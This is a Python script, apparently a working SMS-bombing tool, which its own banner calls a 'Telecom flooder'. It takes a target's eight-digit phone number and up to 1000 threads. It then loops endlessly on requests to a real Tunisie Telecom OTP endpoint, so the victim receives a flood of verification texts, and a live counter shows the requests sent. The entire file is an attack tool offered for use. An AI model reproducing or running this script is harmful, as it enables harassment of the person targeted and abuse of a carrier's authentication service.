import requests
import threading
import itertools
import time
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

init(autoreset=True)

request_count = 0
lock = Lock()

def send_otp(phone_number):
    global request_count
    url = f"https://myttauth.tunisietelecom.tn/realms/selfcareportal/sms/otp-code?phoneNumber={phone_number}"
    try:
        requests.get(url, timeout=5)
        with lock:
            request_count += 1
    except:
        pass

def worker(phone_number):
    while True:
        send_otp(phone_number)

def show_counter():
    spinner = itertools.cycle(['|', '/', '-', '\\'])
    while True:
        with lock:
            count = request_count
        spin = next(spinner)
        print(f"\r{Fore.CYAN}[{spin}] {Fore.GREEN}Sent requests: {count}", end='', flush=True)
        time.sleep(0.1)

def main():
    phone_number = input(Fore.CYAN + "Enter phone number (e.g. 95467473): ").strip()
    if not phone_number.isdigit() or len(phone_number) != 8:
        print(Fore.RED + "Invalid phone number. Must be 8 digits.")
        return

    try:
        thread_count = int(input(Fore.CYAN + "How many threads? (10 to 1000): ").strip())
        if not 10 <= thread_count <= 1000:
            raise ValueError
    except ValueError:
        print(Fore.RED + "Invalid thread count. Must be between 10 and 1000.")
        return

    print(Fore.GREEN + f"\n🚀 Launching Telecom flooder with {thread_count} threads targeting {phone_number}...\n")

    global request_count
    request_count = 0

    threading.Thread(target=show_counter, daemon=True).start()

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        for _ in range(thread_count):
            executor.submit(worker, phone_number)

if __name__ == "__main__":
    main()
